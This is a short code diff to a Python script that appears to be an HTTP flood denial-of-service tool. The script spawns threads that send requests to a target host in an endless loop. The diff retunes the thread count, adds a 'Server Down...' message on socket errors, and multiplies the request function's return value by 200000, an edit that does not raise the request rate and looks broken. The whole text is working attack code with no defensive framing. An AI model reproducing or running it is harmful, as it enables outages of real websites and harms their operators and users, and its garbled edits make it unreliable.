@@ -109,11 +109,12 @@ class HTTPThread(threading.Thread):
 	def run(self):
 		try:
 			while True:
-				code=httpcall(url)
+				code=httpcall(url) * 200000
 				
 				
 					
-		except:
+		except socket.error:
+			print "Server Down..."
 			pass
 
 # monitors http threads and counts requests
@@ -143,7 +144,7 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in xrange(1374389534):
+		for i in range(900):
                         
 			t = HTTPThread()
 			t.start()
